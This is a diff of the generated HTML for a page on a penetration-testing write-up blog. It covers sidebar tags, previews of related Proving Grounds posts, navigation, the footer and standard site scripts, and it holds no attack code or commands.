+    
+    
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+
+
+  <section>
+    <h2 class="panel-heading">Trending Tags</h2>
+    <div class="d-flex flex-wrap mt-3 mb-1 me-3">
+      
+        
+        <a class="post-tag btn btn-outline-primary" href="/tags/linux/">Linux</a>
+      
+        
+        <a class="post-tag btn btn-outline-primary" href="/tags/oscp/">OSCP</a>
+      
+        
+        <a class="post-tag btn btn-outline-primary" href="/tags/web/">Web</a>
+      
+        
+        <a class="post-tag btn btn-outline-primary" href="/tags/htb/">HTB</a>
+      
+        
+        <a class="post-tag btn btn-outline-primary" href="/tags/snmp/">SNMP</a>
+      
+        
+        <a class="post-tag btn btn-outline-primary" href="/tags/windows/">Windows</a>
+      
+        
+        <a class="post-tag btn btn-outline-primary" href="/tags/clamav-milter/">ClamAV-Milter</a>
+      
+        
+        <a class="post-tag btn btn-outline-primary" href="/tags/craftcms/">CraftCMS</a>
+      
+        
+        <a class="post-tag btn btn-outline-primary" href="/tags/exiftool/">Exiftool</a>
+      
+        
+        <a class="post-tag btn btn-outline-primary" href="/tags/juicypotato/">JuicyPotato</a>
+      
     </div>
-    <div class="toast-body text-center pt-0">
-      <p class="px-2 mb-3">A new version of content is available.</p>
-      <button type="button" class="btn btn-primary" aria-label="Update">
-        Update
-      </button>
-    </div>
+  </section>
+
+
+            </div>
+
+            
+              
+              
+
+
+
+  <section id="toc-wrapper" class="d-none ps-0 pe-4">
+    <h2 class="panel-heading ps-3 mb-2">Contents</h2>
+    <nav id="toc"></nav>
+  </section>
+
+
+            
+          </aside>
+        </div>
+
+        <div class="row">
+          <!-- tail -->
+          <div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 px-md-4">
+            
+              
+              <!-- Recommend the other 3 posts according to the tags and categories of the current post. -->
+
+<!-- The total size of related posts -->
+
+
+<!-- An random integer that bigger than 0 -->
+
+
+<!-- Equals to TAG_SCORE / {max_categories_hierarchy} -->
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  <aside id="related-posts" aria-labelledby="related-label">
+    <h3 class="mb-4" id="related-label">Further Reading</h3>
+    <nav class="row row-cols-1 row-cols-md-2 row-cols-xl-3 g-4 mb-4">
+      
+        <article class="col">
+          <a href="/posts/Proving-Grounds-Exfiltrated/" class="post-preview card h-100">
+            <div class="card-body">
+              <!--
+  Date format snippet
+  See: ${JS_ROOT}/utils/locale-dateime.js
+-->
+
+
+
+
+<time
+  
+  data-ts="1720839600"
+  data-df="ll"
+  
+>
+  Jul 13, 2024
+</time>
+
+              <h4 class="pt-0 my-2">Proving Grounds - Exfiltrated</h4>
+              <div class="text-muted">
+                <p>Exfiltrated was a well-structured box that provided an excellent opportunity to exploit a Subrion CMS vulnerability and perform privilege escalation via an Exiftool exploit.
+
+Initial enumeration le...</p>
+              </div>
+            </div>
+          </a>
+        </article>
+      
+        <article class="col">
+          <a href="/posts/Proving-Grounds-Twiggy/" class="post-preview card h-100">
+            <div class="card-body">
+              <!--
+  Date format snippet
+  See: ${JS_ROOT}/utils/locale-dateime.js
+-->
+
+
+
+
+<time
+  
+  data-ts="1720753200"
+  data-df="ll"
+  
+>
+  Jul 12, 2024
+</time>
+
+              <h4 class="pt-0 my-2">Proving Grounds - Twiggy</h4>
+              <div class="text-muted">
+                <p>Twiggy was an insightful machine focused on exploiting a SaltStack vulnerability.
+
+The machine required initial enumeration to identify open services, followed by a specific focus on the web servic...</p>
+              </div>
+            </div>
+          </a>
+        </article>
+      
+        <article class="col">
+          <a href="/posts/Proving-Grounds-Fractal/" class="post-preview card h-100">
+            <div class="card-body">
+              <!--
+  Date format snippet
+  See: ${JS_ROOT}/utils/locale-dateime.js
+-->
+
+
+
+
+<time
+  
+  data-ts="1720580400"
+  data-df="ll"
+  
+>
+  Jul 10, 2024
+</time>
+
+              <h4 class="pt-0 my-2">Proving Grounds - Fractal</h4>
+              <div class="text-muted">
+                <p>Fractal was an extremely useful box to learn and train my MySQL skills. It starts with identifying a Symfony CMS through HTTP enumeration.
+
+The Symfony profiler was explored, leading to finding sen...</p>
+              </div>
+            </div>
+          </a>
+        </article>
+      
+    </nav>
   </aside>
+  <!-- #related-posts -->
 
 
+            
+              
+              <!-- Navigation buttons at the bottom of the post. -->
 
-  <!-- JavaScripts -->
-  <!-- JS selector for site. -->
+<nav class="post-navigation d-flex justify-content-between" aria-label="Post Navigation">
+  
+  
 
-  <!-- commons -->
+  
+    <a
+      href="/posts/Proving-Grounds-Fractal/"
+      class="btn btn-outline-primary"
+      aria-label="Older"
+    >
+      <p>Proving Grounds - Fractal</p>
+    </a>
+  
 
-
-
-  <!-- layout specified -->
-
-
-
-
-
-  <!-- image lazy-loading & popup & clipboard -->
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-  <script
-    src="https://cdn.jsdelivr.net/combine/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js,npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.umd.min.js,npm/glightbox@3.3.0/dist/js/glightbox.min.js,npm/clipboard@2.0.11/dist/clipboard.min.js,npm/dayjs@1.11.11/dayjs.min.js,npm/dayjs@1.11.11/locale/en.min.js,npm/dayjs@1.11.11/plugin/relativeTime.min.js,npm/dayjs@1.11.11/plugin/localizedFormat.min.js,npm/tocbot@4.27.20/dist/tocbot.min.js,npm/mermaid@10.9.0/dist/mermaid.min.js"></script>
-
-
-
-
-
-
-
-  <script src="/assets/js/dist/post.min.js"></script>
-
-
-
-  <!-- Pageviews -->
-
-
-
-
+  
+    <a
+      href="/posts/Proving-Grounds-Twiggy/"
+      class="btn btn-outline-primary"
+      aria-label="Newer"
+    >
+      <p>Proving Grounds - Twiggy</p>
+    </a>
+  
+</nav>
+
+            
+              
+              <!-- The comments switcher -->
+
+
+            
+
+            <!-- The Footer -->
+
+<footer
+  aria-label="Site Info"
+  class="d-flex flex-column justify-content-center text-muted flex-lg-row justify-content-lg-between align-items-lg-center pb-lg-3"
+>
+  <p>
+    © <time>2024</time>
+
+    
+    <a href="https://github.com/arthurhendrich"
+      >H3NDR1CH</a
+    >.  
+    <span
+      data-bs-toggle="tooltip"
+      data-bs-placement="top"
+      title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author."
+    >Some rights reserved.</span>
+    
+  </p>
+</footer>
+
+          </div>
+        </div>
+
+        <!-- The Search results -->
+
+<div id="search-result-wrapper" class="d-flex justify-content-center d-none">
+  <div class="col-11 content">
+    <div id="search-hints">
+      <!-- The trending tags list -->
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+
+
+  <section>
+    <h2 class="panel-heading">Trending Tags</h2>
+    <div class="d-flex flex-wrap mt-3 mb-1 me-3">
+      
+        
+        <a class="post-tag btn btn-outline-primary" href="/tags/linux/">Linux</a>
+      
+        
+        <a class="post-tag btn btn-outline-primary" href="/tags/oscp/">OSCP</a>
+      
+        
+        <a class="post-tag btn btn-outline-primary" href="/tags/web/">Web</a>
+      
+        
+        <a class="post-tag btn btn-outline-primary" href="/tags/htb/">HTB</a>
+      
+        
+        <a class="post-tag btn btn-outline-primary" href="/tags/snmp/">SNMP</a>
+      
+        
+        <a class="post-tag btn btn-outline-primary" href="/tags/windows/">Windows</a>
+      
+        
+        <a class="post-tag btn btn-outline-primary" href="/tags/clamav-milter/">ClamAV-Milter</a>
+      
+        
+        <a class="post-tag btn btn-outline-primary" href="/tags/craftcms/">CraftCMS</a>
+      
+        
+        <a class="post-tag btn btn-outline-primary" href="/tags/exiftool/">Exiftool</a>
+      
+        
+        <a class="post-tag btn btn-outline-primary" href="/tags/juicypotato/">JuicyPotato</a>
+      
+    </div>
+  </section>
+
+
+    </div>
+    <div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div>
+  </div>
+</div>
+
+      </div>
+
+      <aside aria-label="Scroll to Top">
+        <button id="back-to-top" type="button" class="btn btn-lg btn-box-shadow">
+          <i class="fas fa-angle-up"></i>
+        </button>
+      </aside>
+    </div>
+
+    <div id="mask"></div>
+
+    
+      <aside
+  id="notification"
+  class="toast"
+  role="alert"
+  aria-live="assertive"
+  aria-atomic="true"
+  data-bs-animation="true"
+  data-bs-autohide="false"
+>
+  <div class="toast-header">
+    <button
+      type="button"
+      class="btn-close ms-auto"
+      data-bs-dismiss="toast"
+      aria-label="Close"
+    ></button>
+  </div>
+  <div class="toast-body text-center pt-0">
+    <p class="px-2 mb-3">A new version of content is available.</p>
+    <button type="button" class="btn btn-primary" aria-label="Update">
+      Update
+    </button>
+  </div>
+</aside>
+
+    
+
+    <!-- JavaScripts -->
+    <!-- JS selector for site. -->
+
+<!-- commons -->
+
+
+
+<!-- layout specified -->
+
+
+  
+
+  
+    <!-- image lazy-loading & popup & clipboard -->
+    
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+    
+
+    
+
+  
+
+  
+    
+
+    
+
+  
+
+  
+    
+
+    
+
+  
+
+  
+    
+
+    
+
+  
+
+  
+    
+
+    
+
+  
+
+  
+    
+
+    
+
+  
+
+  
+    
+
+    
+
+  
+
+  
+    
+
+    
+
+  
+
+  
+    
+
+    
+
+  
+
+  
+    
+
+    
+
+  
+
+
+
+  <script src="https://cdn.jsdelivr.net/combine/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js,npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.umd.min.js,npm/glightbox@3.3.0/dist/js/glightbox.min.js,npm/clipboard@2.0.11/dist/clipboard.min.js,npm/dayjs@1.11.11/dayjs.min.js,npm/dayjs@1.11.11/locale/en.min.js,npm/dayjs@1.11.11/plugin/relativeTime.min.js,npm/dayjs@1.11.11/plugin/localizedFormat.min.js,npm/tocbot@4.27.20/dist/tocbot.min.js,npm/mermaid@10.9.0/dist/mermaid.min.js"></script>
+
+
+
+
+
+
+
+<script src="/assets/js/dist/post.min.js"></script>
+
+
+
+<!-- Pageviews -->
+
+  
+
+  
 
 
 
   <!-- mermaid-js loader -->
-  <script type="text/javascript">
-    function updateMermaid(event) {
-      if (event.source === window && event.data && event.data.direction === ModeToggle.ID) {
-        const mode = event.data.message;
+<script type="text/javascript">
+  function updateMermaid(event) {
+    if (event.source === window && event.data && event.data.direction === ModeToggle.ID) {
+      const mode = event.data.message;
 
-        if (typeof mermaid === 'undefined') {
-          return;
-        }
-
-        let expectedTheme = mode === ModeToggle.DARK_MODE ? 'dark' : 'default';
-        let config = { theme: expectedTheme }; const mermaidList = document.getElementsByClassName('mermaid');
-
-        [...mermaidList].forEach((elem) => {
-          const svgCode = elem.previousSibling.children.item(0).innerHTML;
-          elem.innerHTML = svgCode;
-          elem.removeAttribute('data-processed');
-        });
-
-        mermaid.initialize(config);
-        mermaid.init(undefined, '.mermaid');
-      }
-    }
-
-    (function () {
-      let initTheme = 'default';
-      const html = document.documentElement;
-
-      if (
-        (html.hasAttribute('data-mode') && html.getAttribute('data-mode') === 'dark') ||
-        (!html.hasAttribute('data-mode') && window.matchMedia('(prefers-color-scheme: dark)').matches)
-      ) {
-        initTheme = 'dark';
+      if (typeof mermaid === 'undefined') {
+        return;
       }
 
-      let mermaidConf = {
-        theme: initTheme
-      }; const basicList = document.getElementsByClassName('language-mermaid');
-      [...basicList].forEach((elem) => {
-        const svgCode = elem.textContent;
-        const backup = elem.parentElement;
-        backup.classList.add('d-none'); let mermaid = document.createElement('pre');
-        mermaid.classList.add('mermaid');
-        const text = document.createTextNode(svgCode);
-        mermaid.appendChild(text);
-        backup.after(mermaid);
+      let expectedTheme = mode === ModeToggle.DARK_MODE ? 'dark' : 'default';
+      let config = { theme: expectedTheme };const mermaidList = document.getElementsByClassName('mermaid');
+
+      [...mermaidList].forEach((elem) => {
+        const svgCode = elem.previousSibling.children.item(0).innerHTML;
+        elem.innerHTML = svgCode;
+        elem.removeAttribute('data-processed');
       });
 
-      mermaid.initialize(mermaidConf);
-      window.addEventListener('message', updateMermaid);
-    })();
-  </script>
+      mermaid.initialize(config);
+      mermaid.init(undefined, '.mermaid');
+    }
+  }
+
+  (function () {
+    let initTheme = 'default';
+    const html = document.documentElement;
+
+    if (
+      (html.hasAttribute('data-mode') && html.getAttribute('data-mode') === 'dark') ||
+      (!html.hasAttribute('data-mode') && window.matchMedia('(prefers-color-scheme: dark)').matches)
+    ) {
+      initTheme = 'dark';
+    }
+
+    let mermaidConf = {
+      theme: initTheme};const basicList = document.getElementsByClassName('language-mermaid');
+    [...basicList].forEach((elem) => {
+      const svgCode = elem.textContent;
+      const backup = elem.parentElement;
+      backup.classList.add('d-none');let mermaid = document.createElement('pre');
+      mermaid.classList.add('mermaid');
+      const text = document.createTextNode(svgCode);
+      mermaid.appendChild(text);
+      backup.after(mermaid);
+    });
+
+    mermaid.initialize(mermaidConf);
+    window.addEventListener('message', updateMermaid);
+  })();
+</script>
 
 
 
 
 
 
-  <!--
+    <!--
   Jekyll Simple Search loader
   See: <https://github.com/christian-fei/Simple-Jekyll-Search>
 -->
@@ -4162,32 +4245,32 @@
 
 
 
-  <script>SimpleJekyllSearch({
-      searchInput: document.getElementById('search-input'),
-      resultsContainer: document.getElementById('search-results'),
-      json: '/assets/js/data/search.json',
-      searchResultTemplate: '  <article class="px-1 px-sm-2 px-lg-4 px-xl-0">    <header>      <h2><a href="{url}">{title}</a></h2>      <div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1">        {categories}        {tags}      </div>    </header>    <p>{snippet}</p>  </article>',
-      noResultsText: '<p class="mt-5">Oops! No results found.</p>',
-      templateMiddleware: function (prop, value, template) {
-        if (prop === 'categories') {
-          if (value === '') {
-            return `${value}`;
-          } else {
-            return `<div class="me-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`;
-          }
-        }
-
-        if (prop === 'tags') {
-          if (value === '') {
-            return `${value}`;
-          } else {
-            return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`;
-          }
+<script>SimpleJekyllSearch({
+    searchInput: document.getElementById('search-input'),
+    resultsContainer: document.getElementById('search-results'),
+    json: '/assets/js/data/search.json',
+    searchResultTemplate: '  <article class="px-1 px-sm-2 px-lg-4 px-xl-0">    <header>      <h2><a href="{url}">{title}</a></h2>      <div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1">        {categories}        {tags}      </div>    </header>    <p>{snippet}</p>  </article>',
+    noResultsText: '<p class="mt-5">Oops! No results found.</p>',
+    templateMiddleware: function(prop, value, template) {
+      if (prop === 'categories') {
+        if (value === '') {
+          return `${value}`;
+        } else {
+          return `<div class="me-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`;
         }
       }
-    });
-  </script>
 
-</body>
+      if (prop === 'tags') {
+        if (value === '') {
+          return `${value}`;
+        } else {
+          return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`;
+        }
+      }
+    }
+  });
+</script>
 
+  </body>
 </html>
+
